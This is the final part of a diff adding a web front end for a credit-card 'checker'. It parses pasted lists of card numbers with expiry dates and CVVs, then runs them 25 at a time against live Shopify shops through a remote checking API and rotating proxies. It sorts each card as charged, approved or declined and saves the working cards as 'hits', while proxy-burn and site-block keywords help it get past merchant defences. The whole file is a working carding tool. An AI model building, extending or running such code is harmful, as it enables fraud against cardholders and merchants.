+            'transaction_not_allowed', 'not authorized', 'unauthorized', 'restricted card',
+            'pick up card', 'do_not_honor', 'lost_card', 'stolen_card', 'incorrect_number',
+            'expired_card', 'card_not_supported', 'fraudulent', 'security_violation',
+            'try_again_later', 'currency_not_supported'
+        ];
+
+        const SITE_DEAD_KEYWORDS = [
+            'not shopify', 'site error', 'site not supported', '429', 'rate limit',
+            'throttled', 'timeout', 'connection refused', 'ssl error', 'invalid json',
+            'failed to get session token', 'no_session_token', 'cloudflare',
+            'access denied', 'blocked', 'suspended', 'domain not found', 'server not found',
+            'product id is empty', 'handle is empty', 'tax amount is empty',
+            'no_product', 'no products found', 'NO_PRODUCT'
+        ];
+
+        const PROXY_BURNED_KEYWORDS = [
+            'proxy burned', 'proxy dead', 'blocked', 'banned',
+            'tlsv1 alert', 'ssl routines', 'openssl ssl_connect'
+        ];
+
+        function classifyResponse(responseText) {
+            const low = responseText.toLowerCase();
+
+            for (const kw of CHARGED_KEYWORDS) {
+                if (low.includes(kw)) return { status: 'CHARGED', icon: '💰', cls: 'log-charged' };
+            }
+            for (const kw of APPROVED_KEYWORDS) {
+                if (low.includes(kw)) return { status: 'APPROVED', icon: '✅', cls: 'log-approved' };
+            }
+            for (const kw of DECLINED_KEYWORDS) {
+                if (low.includes(kw)) return { status: 'DECLINED', icon: '❌', cls: 'log-declined' };
+            }
+            for (const kw of PROXY_BURNED_KEYWORDS) {
+                if (low.includes(kw)) return { status: 'ERROR', icon: '🔥', cls: 'log-error' };
+            }
+            for (const kw of SITE_DEAD_KEYWORDS) {
+                if (low.includes(kw)) return { status: 'SITE_ERROR', icon: '⚠️', cls: 'log-site-error' };
+            }
+
+            return { status: 'UNKNOWN', icon: '❓', cls: 'log-error' };
+        }
+
+        // ============================================================
+        // HITS MANAGEMENT
+        // ============================================================
+        let hits = [];
+
+        function loadHits() {
+            try {
+                const saved = localStorage.getItem('hits');
+                if (saved) { hits = JSON.parse(saved); }
+            } catch (e) { hits = []; }
+            updateHitsDisplay();
+        }
+
+        function saveHits() { localStorage.setItem('hits', JSON.stringify(hits)); }
+
+        function updateHitsDisplay() {
+            const container = $('#wrapper-hits .results-logs-container');
+            if (container.length) {
+                container.empty();
+                hits.forEach(h => { container.append(`<span class="log-line log-hit">${h}</span>`); });
+                container.scrollTop(container[0].scrollHeight);
+            }
+            $('.count-hits').text(hits.length);
+        }
+
+        function addHit(entry) {
+            hits.push(entry);
+            saveHits();
+            updateHitsDisplay();
+            $('#allLogsContainer').append(`<span class="log-line log-hit">${entry}</span>`);
+            $('#allLogsContainer').scrollTop($('#allLogsContainer')[0].scrollHeight);
+        }
+
+        // ============================================================
+        // MAIN LOGIC
+        // ============================================================
+        $(document).ready(function() {
+
+            loadProxies();
+            loadSites();
+            loadHits();
+            debugLog('📂 Loaded proxies, sites, and hits from storage', 'info');
+
+            let isTesting = false,
+                stopRequested = false;
+            let cardQueue = [];
+            let currentThreads = 0;
+            const maxThreads = 25;
+
+            let statCharged = 0,
+                statApproved = 0,
+                statTested = 0,
+                statLoaded = 0;
+
+            // Tab switching
+            $('.tab-btn').click(function() {
+                $('.tab-btn').removeClass('active-tab');
+                $(this).addClass('active-tab');
+                const target = $(this).attr('data-target');
+                $('.results-wrapper').removeClass('active-wrapper');
+                $('#' + target).addClass('active-wrapper');
+            });
+
+            // Clear logs
+            $('.purge-log-ico').click(function() {
+                const wrapper = $(this).closest('.results-wrapper');
+                const container = wrapper.find('.results-logs-container');
+                const id = wrapper.attr('id');
+
+                if (id === 'wrapper-hits') {
+                    hits = [];
+                    saveHits();
+                    container.empty();
+                    $('.count-hits').text('0');
+                    debugLog('🗑️ All hits cleared', 'warning');
+                    Swal.fire({ title: 'All hits cleared!', icon: 'success', toast: true, position: 'top-end',
+                        showConfirmButton: false, timer: 1500 });
+                    return;
+                }
+
+                container.empty();
+                if (id === 'wrapper-charged') { statCharged = 0;
+                    $('.count-charged').text('0'); }
+                if (id === 'wrapper-approved') { statApproved = 0;
+                    $('.count-approved').text('0'); }
+                // Declined removed from stats, but log is kept
+
+                debugLog(`🗑️ Cleared ${id.replace('wrapper-', '')} logs`, 'info');
+                Swal.fire({ title: 'Cleared!', icon: 'success', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+            });
+
+            // Copy logs
+            $('.copy-log-ico').click(function() {
+                let text = '';
+                $(this).closest('.results-wrapper').find('.log-line').each(function() {
+                    text += $(this).text() + '\n';
+                });
+                if (!text.trim()) return;
+                navigator.clipboard.writeText(text.trim()).then(() => {
+                    debugLog('📋 Logs copied to clipboard', 'success');
+                    Swal.fire({ title: 'Copied!', icon: 'success', toast: true, position: 'top-end',
+                        showConfirmButton: false, timer: 1500 });
+                });
+            });
+
+            // Individual hit copy
+            $(document).on('click', '.log-hit', function() {
+                const text = $(this).text();
+                navigator.clipboard.writeText(text.trim()).then(() => {
+                    Swal.fire({ title: 'Hit copied!', icon: 'success', toast: true, position: 'top-end',
+                        showConfirmButton: false, timer: 1000 });
+                });
+            });
+
+            // START
+            $('.btn-play').click(function() {
+                if (isTesting) return;
+
+                let raw = $('.form-checker').val().trim();
+                if (!raw) {
+                    Swal.fire({ title: 'Empty list!', icon: 'error', toast: true, position: 'top-end',
+                        showConfirmButton: false, timer: 1500 });
+                    return;
+                }
+
+                const lines = raw.split('\n');
+                const valid = [];
+                lines.forEach(line => {
+                    const match = line.match(/(\d{13,16})\D*(\d{1,2})\D*(\d{2,4})\D*(\d{3,4})/);
+                    if (match) {
+                        const cc = match[1],
+                            mm = match[2].padStart(2, '0'),
+                            yr = match[3].length === 4 ? match[3] : '20' + match[3],
+                            cv = match[4];
+                        const now = new Date();
+                        const curYear = now.getFullYear();
+                        const curMonth = now.getMonth() + 1;
+                        if (parseInt(yr) > curYear || (parseInt(yr) === curYear && parseInt(mm) >= curMonth)) {
+                            valid.push(`${cc}|${mm}|${yr}|${cv}`);
+                        }
+                    }
+                });
+
+                if (valid.length === 0) {
+                    Swal.fire({ title: 'No valid cards!', icon: 'error', toast: true, position: 'top-end',
+                        showConfirmButton: false, timer: 1500 });
+                    return;
+                }
+
+                $('.form-checker').val(valid.join('\n'));
+                cardQueue = [...valid];
+                statLoaded = cardQueue.length;
+                statCharged = 0;
+                statApproved = 0;
+                statTested = 0;
+                $('.count-charged').text('0');
+                $('.count-approved').text('0');
+                $('.count-tested').text('0');
+                $('.count-loaded').text(statLoaded);
+
+                isTesting = true;
+                stopRequested = false;
+                currentThreads = 0;
+
+                $('#statusText').text('Running');
+                $('#statusDot').removeClass('waiting stopped').addClass('running');
+                $('.btn-play').prop('disabled', true);
+                $('.btn-stop').prop('disabled', false);
+
+                // Get current proxy and site for display
+                const currentProxy = document.getElementById('proxyInput').value || 'None';
+                const currentSite = document.getElementById('siteInput').value || 'None';
+                debugLog(`🚀 Starting checker with ${cardQueue.length} cards`, 'info');
+                debugLog(`🔧 Using Proxy: ${currentProxy} | Site: ${currentSite}`, 'detail');
+
+                for (let i = 0; i < maxThreads; i++) {
+                    if (cardQueue.length > 0 && !stopRequested) {
+                        currentThreads++;
+                        processCard(currentProxy, currentSite);
+                    }
+                }
+            });
+
+            // STOP
+            $('.btn-stop').click(function() {
+                stopRequested = true;
+                isTesting = false;
+                currentThreads = 0;
+
+                $('#statusText').text('Stopped');
+                $('#statusDot').removeClass('waiting running').addClass('stopped');
+                $('.btn-play').prop('disabled', false);
+                $('.btn-stop').prop('disabled', true);
+
+                debugLog('⏹️ Stopped by user', 'warning');
+                Swal.fire({ title: 'Stopped!', icon: 'warning', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+            });
+
+            function processCard(proxy, site) {
+                if (cardQueue.length === 0 || stopRequested) {
+                    currentThreads--;
+                    checkCompletion();
+                    return;
+                }
+
+                const card = cardQueue.shift();
+                const apiBase = document.getElementById('apiUrl').value || 'https://charismatic-perfection-production-344e.up.railway.app/shopify';
+                const endpoint = $('#api-Selector').val();
+                const siteUrl = site || document.getElementById('siteInput').value || 'https://lebzone.com';
+                const proxyStr = proxy || document.getElementById('proxyInput').value || '';
+                const key = document.getElementById('apiKey').value || 'darkanon';
+
+                let url =
+                    `${apiBase}?site=${encodeURIComponent(siteUrl)}&cc=${encodeURIComponent(card)}&key=${encodeURIComponent(key)}`;
+                if (proxyStr) {
+                    url += `&proxy=${encodeURIComponent(proxyStr)}`;
+                }
+
+                // Log the request details
+                const cardDisplay = card.substring(0, 8) + '****' + card.substring(card.length - 4);
+                debugLog(`🔄 Checking: ${cardDisplay} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'}`, 'info');
+
+                $.ajax({
+                    url: url,
+                    type: 'GET',
+                    dataType: 'json',
+                    timeout: 30000,
+                    success: function(data) {
+                        statTested++;
+                        $('.count-tested').text(statTested);
+
+                        let responseText = '';
+                        let classification = { status: 'UNKNOWN', icon: '❓', cls: 'log-error' };
+                        let fullResponse = '';
+                        let gate = data.Gate || data.gate || 'Unknown';
+                        let price = data.Price || data.price || '0.00';
+                        let charged = data.Charged || 'False';
+                        let approved = data.Approved || 'False';
+                        let time = data.Time || data.time || 'N/A';
+
+                        // Fix gate detection
+                        if (gate === 'UNKNOWN' || gate === '' || gate === null || gate === 'Unknown Gateway') {
+                            if (siteUrl.includes('myshopify.com') || siteUrl.includes('shopify')) {
+                                gate = 'Shopify Payments';
+                            } else {
+                                gate = 'Credit Card Processor';
+                            }
+                        }
+
+                        if (data.Response) {
+                            fullResponse = data.Response;
+                            // Check for NO_PRODUCT specifically
+                            if (fullResponse.includes('NO_PRODUCT') || fullResponse.toLowerCase().includes(
+                                    'no products found')) {
+                                classification = { status: 'SITE_ERROR', icon: '⚠️', cls: 'log-site-error' };
+                                responseText =
+                                    `[NO_PRODUCT] ${card} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | Gate: ${gate} | Time: ${time}`;
+                                debugLog(`⚠️ NO_PRODUCT: ${card} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'}`,
+                                    'warning');
+                            } else if (charged === 'True' || charged === true) {
+                                classification = { status: 'CHARGED', icon: '💰', cls: 'log-charged' };
+                                responseText =
+                                    `[CHARGED] ${card} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | Gate: ${gate} | Price: $${price} | Time: ${time}`;
+                                debugLog(`💰 CHARGED: ${card} | ${fullResponse} | Gate: ${gate} | $${price}`,
+                                'gold');
+                            } else if (approved === 'True' || approved === true) {
+                                classification = { status: 'APPROVED', icon: '✅', cls: 'log-approved' };
+                                responseText =
+                                    `[APPROVED] ${card} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | Gate: ${gate} | Price: $${price} | Time: ${time}`;
+                                debugLog(`✅ APPROVED: ${card} | ${fullResponse} | Gate: ${gate} | $${price}`,
+                                    'success');
+                            } else {
+                                classification = classifyResponse(fullResponse);
+                                if (classification.status === 'SITE_ERROR') {
+                                    responseText =
+                                        `[SITE_ERROR] ${card} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | ${fullResponse} | Time: ${time}`;
+                                    debugLog(`⚠️ SITE_ERROR: ${card} | ${fullResponse}`, 'warning');
+                                } else {
+                                    responseText =
+                                        `[${fullResponse}] ${card} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | Gate: ${gate} | Time: ${time}`;
+                                    debugLog(`❓ ${fullResponse}: ${card}`, 'info');
+                                }
+                            }
+                        } else if (data.approved === 'True' || data.approved === true) {
+                            classification = { status: 'APPROVED', icon: '✅', cls: 'log-approved' };
+                            responseText =
+                                `[APPROVED] ${card} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | Gate: ${data.gate || gate} | Price: $${data.price || price} | Time: ${data.time || time}`;
+                            debugLog(`✅ APPROVED: ${card} | Site: ${siteUrl}`, 'success');
+                        } else if (data.card_response) {
+                            fullResponse = data.card_response;
+                            classification = classifyResponse(fullResponse);
+                            if (classification.status === 'SITE_ERROR') {
+                                responseText =
+                                    `[SITE_ERROR] ${card} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | ${fullResponse}`;
+                                debugLog(`⚠️ SITE_ERROR: ${card} | ${fullResponse}`, 'warning');
+                            } else {
+                                responseText =
+                                    `[${fullResponse}] ${card} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | Gate: ${data.gate || gate} | Price: $${data.price || price}`;
+                            }
+                        } else {
+                            responseText =
+                                `[UNKNOWN] ${card} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | ${JSON.stringify(data)}`;
+                            classification = { status: 'UNKNOWN', icon: '❓', cls: 'log-error' };
+                            debugLog(`❓ UNKNOWN: ${card} | ${JSON.stringify(data).substring(0, 100)}`, 'info');
+                        }
+
+                        // Override if explicit flags
+                        if (data.Charged === 'True' || data.Charged === true) {
+                            classification = { status: 'CHARGED', icon: '💰', cls: 'log-charged' };
+                        }
+
+                        const status = classification.status;
+                        const icon = classification.icon;
+                        const cls = classification.cls;
+
+                        // Update stats - DECLINED is hidden from dashboard
+                        if (status === 'CHARGED') {
+                            statCharged++;
+                            $('.count-charged').text(statCharged);
+                            statApproved++;
+                            $('.count-approved').text(statApproved);
+                            const hitEntry =
+                                `💰 [CHARGED] ${card} | ${fullResponse} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | Gate: ${gate} | $${price}`;
+                            addHit(hitEntry);
+                            triggerSound();
+                        } else if (status === 'APPROVED') {
+                            statApproved++;
+                            $('.count-approved').text(statApproved);
+                            const hitEntry =
+                                `✅ [APPROVED] ${card} | ${fullResponse} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | Gate: ${gate} | $${price}`;
+                            addHit(hitEntry);
+                        } else if (status === 'SITE_ERROR') {
+                            // Don't add to stats, just log
+                            debugLog(`⚠️ Site Error: ${card} | ${fullResponse}`, 'warning');
+                        }
+
+                        // Add to appropriate tab
+                        const tabMap = {
+                            'CHARGED': 'wrapper-charged',
+                            'APPROVED': 'wrapper-approved',
+                            'DECLINED': 'wrapper-declined',
+                            'ERROR': 'wrapper-errors',
+                            'SITE_ERROR': 'wrapper-errors',
+                            'UNKNOWN': 'wrapper-errors'
+                        };
+                        const wrapperId = tabMap[status] || 'wrapper-errors';
+                        const container = $(`#${wrapperId} .results-logs-container`);
+                        container.append(`<span class="log-line ${cls}">${icon} ${responseText}</span>`);
+                        container.scrollTop(container[0].scrollHeight);
+
+                        // Also add to all logs
+                        $('#allLogsContainer').append(`<span class="log-line ${cls}">${icon} ${responseText}</span>`);
+                        $('#allLogsContainer').scrollTop($('#allLogsContainer')[0].scrollHeight);
+
+                        // Remove from textarea
+                        const currentVal = $('.form-checker').val().split('\n');
+                        currentVal.shift();
+                        $('.form-checker').val(currentVal.join('\n'));
+                    },
+                    error: function(xhr, status, error) {
+                        if (status === 'abort' || stopRequested) {
+                            cardQueue.push(card);
+                            return;
+                        }
+                        statTested++;
+                        $('.count-tested').text(statTested);
+
+                        const errMsg =
+                            `[ERROR] ${card} | Site: ${siteUrl} | Proxy: ${proxyStr || 'None'} | ${status} - ${error || 'Unknown error'}`;
+                        const container = $('#wrapper-errors .results-logs-container');
+                        container.append(`<span class="log-line log-error">❌ ${errMsg}</span>`);
+                        container.scrollTop(container[0].scrollHeight);
+                        $('#allLogsContainer').append(`<span class="log-line log-error">❌ ${errMsg}</span>`);
+                        $('#allLogsContainer').scrollTop($('#allLogsContainer')[0].scrollHeight);
+                        debugLog(`❌ API Error: ${card} | ${status}`, 'error');
+                    },
+                    complete: function() {
+                        processCard(proxy, site);
+                    }
+                });
+            }
+
+            function checkCompletion() {
+                if (currentThreads <= 0 && isTesting) {
+                    isTesting = false;
+                    $('#statusText').text('Waiting');
+                    $('#statusDot').removeClass('running stopped').addClass('waiting');
+                    $('.btn-play').prop('disabled', false);
+                    $('.btn-stop').prop('disabled', true);
+
+                    // Reset checked to 0 after completion
+                    statTested = 0;
+                    $('.count-tested').text('0');
+
+                    debugLog(`✅ Completed! Charged: ${statCharged}, Approved: ${statApproved}, Hits: ${hits.length}`,
+                        'success');
+                    Swal.fire({
+                        title: 'Completed!',
+                        text: `Charged: ${statCharged} | Approved: ${statApproved} | Hits: ${hits.length}`,
+                        icon: 'success',
+                        toast: true,
+                        position: 'top-end',
+                        showConfirmButton: false,
+                        timer: 3000
+                    });
+                }
+            }
+
+            function triggerSound() {
+                try {
+                    const audio = new Audio(
+                        'data:audio/wav;base64,UklGRnoAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoAAACBhYqFhYaFg4SDg4OEg4SEg4aFh4uNioyPkZKTk5WTlJSSlJSTlZWWl5eYmpucnZ6fnqCgoKGhoqKio6Slpaamp6eoqaqrq6ysra6ur7CwsbGysrO0tLW1tra3t7i4ubq6uru8vb2+v7/AwMHCAg=='
+                        );
+                    audio.play();
+                } catch (e) {}
+            }
+
+            // Auto-select proxy and site
+            function autoSelectProxy() {
+                if (proxies.length > 0) {
+                    const alive = proxies.filter(p => p.status === 'alive');
+                    const selected = alive.length > 0 ? alive[0] : proxies[0];
+                    document.getElementById('proxyInput').value = selected.proxy;
+                    debugLog(`🔀 Auto-selected proxy: ${selected.proxy}`, 'info');
+                }
+            }
+
+            function autoSelectSite() {
+                if (sites.length > 0) {
+                    const alive = sites.filter(s => s.status === 'alive');
+                    const selected = alive.length > 0 ? alive[0] : sites[0];
+                    document.getElementById('siteInput').value = selected.site;
+                    debugLog(`🌐 Auto-selected site: ${selected.site}`, 'info');
+                }
+            }
+
+            setTimeout(() => {
+                autoSelectProxy();
+                autoSelectSite();
+            }, 500);
+
+            setInterval(() => {
+                if (proxies.length > 0 && !document.getElementById('proxyInput').value) { autoSelectProxy(); }
+                if (sites.length > 0 && !document.getElementById('siteInput').value) { autoSelectSite(); }
+            }, 5000);
+
+            // Deduplicate sites
+            const uniqueSites = [];
+            const seen = new Set();
+            sites.forEach(s => {
+                if (!seen.has(s.site)) {
+                    seen.add(s.site);
+                    uniqueSites.push(s);
+                }
+            });
+            if (uniqueSites.length !== sites.length) {
+                sites = uniqueSites;
+                saveSites();
+                renderSiteTable();
+                debugLog(`🔧 Deduplicated sites (${sites.length} unique)`, 'info');
+            }
+
+            debugLog('✅ System fully initialized and ready', 'success');
+        });
+    </script>
+</body>
+</html>
